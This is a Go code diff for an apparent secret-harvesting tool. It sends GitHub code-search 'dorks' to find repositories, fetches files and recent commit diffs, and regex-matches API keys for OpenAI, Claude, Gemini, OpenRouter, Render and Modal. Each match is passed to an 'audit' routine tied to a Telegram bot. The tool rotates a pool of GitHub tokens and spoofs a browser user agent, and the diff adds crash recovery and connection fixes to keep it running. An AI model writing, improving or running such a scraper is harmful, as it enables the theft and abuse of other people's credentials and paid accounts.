@@ -700,30 +700,60 @@ func NewAuditor(bot *TelegramBot) *Auditor {
 	}
 }
 
-// Global text scanner across all key patterns
+// Global text scanner across all key patterns with panic recovery
 func (a *Auditor) ScanText(text, source string) {
 	if text == "" {
 		return
 	}
+	defer func() {
+		if r := recover(); r != nil {
+			_ = r
+		}
+	}()
+
 	for _, k := range OpenAIKeyRegex.FindAllString(text, -1) {
-		go a.AuditOpenAI(k, source)
+		keyCopy := k
+		go func() {
+			defer func() { _ = recover() }()
+			a.AuditOpenAI(keyCopy, source)
+		}()
 	}
 	for _, k := range ClaudeKeyRegex.FindAllString(text, -1) {
-		go a.AuditClaude(k, source)
+		keyCopy := k
+		go func() {
+			defer func() { _ = recover() }()
+			a.AuditClaude(keyCopy, source)
+		}()
 	}
 	for _, k := range GeminiKeyRegex.FindAllString(text, -1) {
-		go a.AuditGemini(k, source)
+		keyCopy := k
+		go func() {
+			defer func() { _ = recover() }()
+			a.AuditGemini(keyCopy, source)
+		}()
 	}
 	for _, k := range OpenRouterKeyRegex.FindAllString(text, -1) {
-		go a.AuditOpenRouter(k, source)
+		keyCopy := k
+		go func() {
+			defer func() { _ = recover() }()
+			a.AuditOpenRouter(keyCopy, source)
+		}()
 	}
 	for _, k := range RenderKeyRegex.FindAllString(text, -1) {
-		go a.AuditRender(k, source)
+		keyCopy := k
+		go func() {
+			defer func() { _ = recover() }()
+			a.AuditRender(keyCopy, source)
+		}()
 	}
 	aks := ModalTokenIDRegex.FindAllString(text, -1)
 	ases := ModalTokenSecretRegex.FindAllString(text, -1)
 	if len(aks) > 0 && len(ases) > 0 {
-		go a.AuditModal(aks[0], ases[0], source)
+		akCopy, asCopy := aks[0], ases[0]
+		go func() {
+			defer func() { _ = recover() }()
+			a.AuditModal(akCopy, asCopy, source)
+		}()
 	}
 }
 
@@ -1093,10 +1123,11 @@ Target Verification:
 	fileQueue := make(chan FileTask, MaxQueueSize)
 	repoQueue := make(chan string, 500)
 
-	// Workers (25 Parallel File Extractors with API & Raw Branch Fallback)
-	for i := 1; i <= WorkerCount; i++ {
+	// Workers (15 Parallel File Extractors with leak-safe HTTP)
+	for i := 1; i <= 15; i++ {
 		go func(id int) {
-			client := &http.Client{Timeout: 15 * time.Second}
+			defer func() { _ = recover() }()
+			client := &http.Client{Timeout: 12 * time.Second}
 			for {
 				select {
 				case <-ctx.Done():
@@ -1113,9 +1144,8 @@ Target Verification:
 
 					token := tokenPool.GetRandomToken()
 					var content []byte
-					var fetchErr error
 
-					// 1. Try GitHub API contents with raw header (resolves repo default branch automatically)
+					// 1. Try GitHub API contents with raw header
 					apiURL := fmt.Sprintf("https://api.github.com/repos/%s/contents/%s", task.RepoName, task.FilePath)
 					req, err := http.NewRequest("GET", apiURL, nil)
 					if err == nil {
@@ -1124,16 +1154,14 @@ Target Verification:
 						}
 						req.Header.Set("Accept", "application/vnd.github.v3.raw")
 						req.Header.Set("User-Agent", "Mozilla/5.0")
-						resp, err := client.Do(req)
-						if err == nil && resp != nil {
+						resp, rErr := client.Do(req)
+						if rErr == nil && resp != nil {
 							if resp.StatusCode == 401 && token != "" {
 								tokenPool.MarkDead(token)
 							} else if resp.StatusCode == 200 {
-								content, fetchErr = io.ReadAll(resp.Body)
-								resp.Body.Close()
-							} else {
-								resp.Body.Close()
+								content, _ = io.ReadAll(resp.Body)
 							}
+							resp.Body.Close()
 						}
 					}
 
@@ -1149,7 +1177,7 @@ Target Verification:
 							rResp, rErr := client.Do(rReq)
 							if rErr == nil && rResp != nil {
 								if rResp.StatusCode == 200 {
-									content, fetchErr = io.ReadAll(rResp.Body)
+									content, _ = io.ReadAll(rResp.Body)
 									rResp.Body.Close()
 									break
 								}
@@ -1158,7 +1186,7 @@ Target Verification:
 						}
 					}
 
-					if len(content) > 0 && fetchErr == nil {
+					if len(content) > 0 {
 						strContent := string(content)
 						auditor.ScanText(strContent, fileKey)
 
@@ -1176,10 +1204,11 @@ Target Verification:
 		}(i)
 	}
 
-	// 6 Parallel Commit Diff Vacuum Workers
-	for w := 0; w < 6; w++ {
+	// 4 Parallel Commit Diff Vacuum Workers
+	for w := 0; w < 4; w++ {
 		go func() {
-			client := &http.Client{Timeout: 15 * time.Second}
+			defer func() { _ = recover() }()
+			client := &http.Client{Timeout: 12 * time.Second}
 			for {
 				select {
 				case <-ctx.Done():
@@ -1190,50 +1219,58 @@ Target Verification:
 					}
 
 					token := tokenPool.GetRandomToken()
-					url := fmt.Sprintf("https://api.github.com/repos/%s/commits?per_page=6", repo)
+					url := fmt.Sprintf("https://api.github.com/repos/%s/commits?per_page=5", repo)
 					req, _ := http.NewRequest("GET", url, nil)
 					if token != "" {
 						req.Header.Set("Authorization", "token "+token)
 					}
 					resp, err := client.Do(req)
-					if err == nil && resp != nil && resp.StatusCode == 200 {
-						var commits []struct {
-							SHA string `json:"sha"`
-						}
-						body, _ := io.ReadAll(resp.Body)
-						resp.Body.Close()
-						if json.Unmarshal(body, &commits) == nil {
-							for _, c := range commits {
-								if dedup.HasCommit(c.SHA) {
-									continue
-								}
-								cURL := fmt.Sprintf("https://api.github.com/repos/%s/commits/%s", repo, c.SHA)
-								cReq, _ := http.NewRequest("GET", cURL, nil)
-								if token != "" {
-									cReq.Header.Set("Authorization", "token "+token)
-								}
-								cResp, cErr := client.Do(cReq)
-								if cErr == nil && cResp != nil && cResp.StatusCode == 200 {
-									var cData struct {
-										Files []struct {
-											Patch string `json:"patch"`
-										} `json:"files"`
+					if err == nil && resp != nil {
+						if resp.StatusCode == 200 {
+							var commits []struct {
+								SHA string `json:"sha"`
+							}
+							body, _ := io.ReadAll(resp.Body)
+							if json.Unmarshal(body, &commits) == nil {
+								for _, c := range commits {
+									if c.SHA == "" || dedup.HasCommit(c.SHA) {
+										continue
 									}
-									cBody, _ := io.ReadAll(cResp.Body)
-									cResp.Body.Close()
-									if json.Unmarshal(cBody, &cData) == nil {
-										for _, f := range cData.Files {
-											auditor.ScanText(f.Patch, repo+" (Commit: "+c.SHA[:7]+")")
+									cURL := fmt.Sprintf("https://api.github.com/repos/%s/commits/%s", repo, c.SHA)
+									cReq, _ := http.NewRequest("GET", cURL, nil)
+									if token != "" {
+										cReq.Header.Set("Authorization", "token "+token)
+									}
+									cResp, cErr := client.Do(cReq)
+									if cErr == nil && cResp != nil {
+										if cResp.StatusCode == 200 {
+											var cData struct {
+												Files []struct {
+													Patch string `json:"patch"`
+												} `json:"files"`
+											}
+											cBody, _ := io.ReadAll(cResp.Body)
+											if json.Unmarshal(cBody, &cData) == nil {
+												shaShort := c.SHA
+												if len(shaShort) > 7 {
+													shaShort = shaShort[:7]
+												}
+												for _, f := range cData.Files {
+													auditor.ScanText(f.Patch, repo+" (Commit: "+shaShort+")")
+												}
+											}
+											atomic.AddUint64(&GlobalStats.CommitsDiffed, 1)
 										}
+										cResp.Body.Close()
 									}
-									atomic.AddUint64(&GlobalStats.CommitsDiffed, 1)
+									dedup.AddCommit(c.SHA)
 								}
-								dedup.AddCommit(c.SHA)
 							}
 						}
+						resp.Body.Close()
 					}
 					dedup.AddRepo(repo)
-					time.Sleep(200 * time.Millisecond)
+					time.Sleep(300 * time.Millisecond)
 				}
 			}
 		}()
@@ -1241,6 +1278,7 @@ Target Verification:
 
 	// Code Search Producer with Expanded Multi-Engine Dork Fleet
 	go func() {
+		defer func() { _ = recover() }()
 		client := &http.Client{Timeout: 15 * time.Second}
 		dorks := []string{
 			// OpenAI Targeted
@@ -1312,7 +1350,6 @@ Target Verification:
 							} `json:"items"`
 						}
 						body, _ := io.ReadAll(resp.Body)
-						resp.Body.Close()
 						if json.Unmarshal(body, &res) == nil {
 							for _, it := range res.Items {
 								rName := it.Repository.FullName
@@ -1329,6 +1366,7 @@ Target Verification:
 							}
 						}
 					}
+					resp.Body.Close()
 				}
 				// Smart pacing
 				time.Sleep(2 * time.Second)
